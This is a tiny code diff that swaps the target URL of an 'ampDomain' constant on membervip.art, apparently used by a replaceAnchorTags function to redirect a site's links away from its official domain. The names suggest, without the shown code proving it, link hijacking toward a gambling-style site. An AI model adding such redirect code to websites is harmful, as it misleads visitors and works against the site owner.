@@ -1,6 +1,6 @@
 // Define the official domains
 const officialDomain = 'https://www.micazen.com/about/'; 
-const ampDomain = 'https://membervip.art/ying77/';       
+const ampDomain = 'https://membervip.art/istana338/';       
 
 function replaceAnchorTags() {
   
